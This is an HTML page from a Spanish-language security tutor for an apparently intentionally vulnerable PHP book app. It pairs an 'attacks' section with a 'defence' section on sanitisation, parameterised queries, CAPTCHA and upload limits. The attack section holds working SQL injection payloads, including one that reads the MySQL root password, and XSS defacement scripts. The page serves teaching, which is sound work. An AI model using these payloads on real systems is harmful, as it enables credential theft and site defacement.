<!DOCTYPE html>
<!--
To change this license header, choose License Headers in Project Properties.
To change this template file, choose Tools | Templates
and open the template in the editor.
-->
<html>
    <head>
        <title>Mu&ntilde;a: Tutor</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="../css/bootstrap.css" rel="stylesheet" type="text/css"/>
        <script src="../js/jquery-2.1.4.js" type="text/javascript"></script>
        <style type="text/css">
			h3, h4{
				color:#900;
			}
		</style>
    </head>
    <body>
    <nav class="navbar navbar-inverse navbar-fixed-top">
       <a class="navbar-brand" href="#"><span class="glyphicon glyphicon-grain"></span> Mu&ntilde;a Tutor</a>
       <p class="navbar-text navbar-right text-right"><a href="#" onClick="javascript:imprimir()"><span class="glyphicon glyphicon-print"></span>&nbsp;&nbsp;&nbsp;</a></p>
    </nav>

        <div id='ataque' style="padding: 25px; padding-top:40px; background-color:#FFF5F0">
          <h3><center>Ataques</center></h3>
          <h4>Ataques de Inyeccion Sql</h4>
          <h5><strong>Ejemplos:</strong></h5>
          <p>Tenemos la siguiente consulta para insertar un nuevo registro en la tabla usuario.</p>
          <p>	$sql = &quot;Insert into usuario values (null, '$cuenta', '$clave', '$nombre', '$apellido','$fecha')&quot;;;</p>
          <p>Podemos realizar algunas inyecciones sql.          </p>
          <hr/>
          <p>Registrar el la version del servidor de base de datos en el campo Nombre. El resultado lo puede ver en la lista de libros</p>
          <p>Autor= saul', @@version, null, null, 1); -- </p>
          <p>Descripción = cualquier cosa</p>
          <hr/>
          <p>Registrar el nombre de la base de datos en el campo Nombre. El resultado lo puede ver en la lista de libros</p>
          <p>Nombre = saul', (SELECT DATABASE()), null, null, 1); -- </p>
          <p>Descripción = cualquier cosa</p>
          <hr/>
          <p>Lista de tablas  de la base de datos en el campo Nombre. El resultado lo puede ver en la lista de libros</p>
          <p>Nombre = saul', (SELECT GROUP_CONCAT(TABLE_NAME) from information_schema.tables where TABLE_SCHEMA = DATABASE() ),  null, null, 1); -- </p>
          <p>Descripción  = cualquier cosa</p>
          <hr/>
          <p>Podemos robarnos la contraseña del usuario root de la base de datos. El resultado lo puede ver en la lista de libros</p>
          <p>Nombre = saul',(select password from mysql.user where user='root' LIMIT 0,1), null, null, 1'); -- </p>
          <p>Descripción  = cualquier cosa</p>
          <hr/>
          <p>&nbsp;</p>
          <h4>Ataques XSS</h4>
          <h5><strong>Ejemplos:</strong></h5>
          <p>Podemos inyectar código java script o código html en cualquier caja de texto, saltandonos las validaciones</p>
          <hr/>
          <p>Autor = &lt;script&gt;alert(\'Has sido hackeado\');&lt;/script&gt; </p>
          <hr/>
          <p>Descripción = &lt;img src=\'http://www.encuesta2.com/img/headers/2014-10/i_1413997197_images-jpg.jpg\' /&gt;</p>
          <hr/>
          <p>Descripción = &lt;body&gt;&lt;h1&gt;Hackeado por los piratas&lt;/h1&gt;&lt;/body&gt;&lt;!--</p>
          <hr/>
          <p>Si registramos este código java script en el campo descripción, practicamente estamos matando la aplicación (<a href="https://losindestructibles.wordpress.com/2012/09/30/defacing-web-2/" onmousedown="return rwt(this,'','','','3','AFQjCNGr_6J_2vbrlwjlz64wbW0d9P7Vgw','','0ahUKEwj_prfohpXOAhVFJR4KHR4jB4wQFggsMAI','','',event)"><strong>DEFACING WEB</strong></a>). No muestra la lista de libros ni el menú.</p>
          <p>Descripción = &lt;script&gt;document.body.innerHTML=&quot;&lt;style&gt;body{visibility:hidden;}&lt;/style&gt;&lt;div style=visibility:visible;&gt;&lt;CENTER&gt;&lt;h1&gt;HACKEADO POR LOS PIRATAS INFORMATICOS &lt;br/&gt;(Anonimus =( )&lt;/h1&gt;&lt;img src=\'images/hack.jpg\'/&gt;&lt;/div&gt;&lt;/CENTER&gt;&quot;;&lt;/script&gt;</p>
          <hr/>
          <p>&nbsp;</p>
<h4>Ataques SPAN, DoS y Ataques de Fuerza Bruta</h4>
          <p>En este módulo los usuarios deben cargar archivos al servidor, una imagen como portada, y el libro como tal en formato pdf. Si no tenemos control del tamaño máximo permitido, nos pueden llenar la memoria del servidor subiendo archivos de gran tamaño. Peor aún, si no tenemos el control del tipo de archivo, pueden subir al servidor scripts o ejecutables maliciosos (maleware, troyanos, virus. etc) y ejecutarlos causando daños de consideración.          </p>
          <p><a href="https://es.wikipedia.org/wiki/Captcha" target="_blank">mas informacion</a></p>
        </div>
        <div id='defensa' style="padding: 20px; background-color:#EAFFEA">
          <h3><center>Defensa</center></h3>
          <h4>Ataques de Inyeccion Sql y XSS</h4>
          
          
          <p>Para evitar ataques del tipo inyección SQL y/o del tipo XSS debemos <em><strong>validar y filtrar</strong></em> los datos de entrada. En la clase Seguridad.class.php encontramos el método &quot;protected function sanatizar($dato)&quot;, éste método nos sirve para filtrar los datos de entrada a la aplicación.</p>
          <p>En la clase &quot;Libro.class.php&quot; en el método &quot;Insertar($titulo, $autor, $descripcion, $portada, $url, $fkUsuario)&quot; descomente el codigo asociado a la Seguridad de inyección sql.</p>
          <p> $titulo = $this-&gt;sanatizar($titulo);<br>
            $autor = $this-&gt;sanatizar($autor);</p>
          <p>...</p>
          <p>Una opción aún mejor es utilizar <em><strong>consultas parametrizadas</strong></em>, en la clase &quot;Seguridad.class.php&quot; se tienen los métodos para usar este tipo de consultas. Recuerde que es mejor tener seguridad redundante que no tener ningún tipo de seguridad.</p>
          <h4>Ataques SPAN</h4>
          <p>Para evitar los ataques del tipo SPA                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         N podemos usar codigos <strong>CAPTCHA (prueba de Turing público completamente automatizado para diferenciar entre ordenadores y humanos), </strong>los ataques del tipo exploit no pueden leer los captcha ya que son código aleatorios de tipo imagen.</p>
          <p>Para evitar que los usuarios suban archivos de gran tamaño, podemos restringir el tamaño maximo de los archivos permitidos. En el codigo &quot;aportarController.php&quot; descomente el codigo relacionado con este tipo ede ataques.</p>
          <pre>if((!strpos($tipoPortada, &quot;jpg&quot;) &amp;&amp; !strpos($tipoPortada, &quot;JPEG&quot;) &amp;&amp; !strpos($tipoPortada, &quot;png&quot;)) || ($tamanoPortada &gt; 102400))<br>{<br>        echo ...
	return;
}</pre>
	<hr/>
	<p>
		Podemos controlar tambien el tamaño permitido realizando la configuración desde el archivo "php.ini" del servidor Apache. 
	</p>
	....
	<p>post_max_size=30M</p>
	<p>upload_max_filesize=30M</p>
	...
    </div>
    </body>
    <script type="text/javascript">
	function imprimir() 
	{
			if (window.print)
				window.print()
			else
				alert("Para imprimir presione Crtl+P.");
	}
	</script>
</html>
